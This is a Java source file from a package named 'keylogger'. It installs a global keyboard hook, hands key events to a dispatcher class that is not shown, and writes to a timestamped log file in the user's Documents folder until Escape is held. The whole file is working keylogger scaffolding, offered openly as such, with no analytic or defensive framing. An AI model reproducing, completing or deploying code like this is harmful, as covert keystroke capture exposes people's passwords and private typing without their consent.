package keylogger;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class JavaKeyboardOperator {
    public static final File fileObject;
    public static final FileWriter fileWriterObject;

    static {
        fileObject = new File(acquireLogfilePath());
        try {
            fileObject.createNewFile();
            fileWriterObject = new FileWriter(fileObject);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    
    @NotNull
    public static String acquireLogfilePath() {
        var now = LocalDateTime.now();
        var formatter = DateTimeFormatter.ofPattern("uuuu-MMM-d-H-m-s");

        return System.getProperty("user.home") + "\\Documents\\" + now.format(formatter) + ".log";
    }
    
    public static void main(String[] args) throws IOException {
        
        // Hooks
        var keyboardHook = new GlobalKeyboardHook(true);
        keyboardHook.addKeyListener(new JavaKeyboardDispatcher());

        while (keyboardHook.isAlive()) {
            if (keyboardHook.isKeyHeldDown(GlobalKeyEvent.VK_ESCAPE)) {
                fileWriterObject.close();
                keyboardHook.shutdownHook();
            }
        }
    }
}
